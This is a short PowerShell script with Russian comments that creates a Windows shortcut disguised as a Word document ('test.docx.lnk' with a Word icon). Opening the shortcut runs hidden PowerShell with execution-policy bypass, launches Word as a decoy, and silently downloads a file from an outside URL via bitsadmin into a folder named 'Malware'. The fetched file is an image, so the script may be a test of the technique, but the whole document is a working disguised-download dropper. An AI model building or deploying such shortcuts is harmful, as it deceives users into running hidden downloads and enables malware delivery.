$url = "https://i.pinimg.com/originals/b2/dc/9c/b2dc9c2cee44e45672ad6e3994563ac2.jpg"
$output = "C:\Malware\1.jpg"

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$PWD\test.docx.lnk")

# Указываем PowerShell как основной процесс
$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

# Аргументы: скрытый запуск, открытие Word и скачивание через bitsadmin
$psCommand = "Start-Process -FilePath 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE' -ArgumentList '$env:APPDATA\Microsoft\Templates\Normal.dotm'; Start-Process bitsadmin -ArgumentList '/transfer myJob $url $output' -WindowStyle Hidden"

$Shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$psCommand`""

# Иконка Word
$Shortcut.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,0"

$Shortcut.Save()
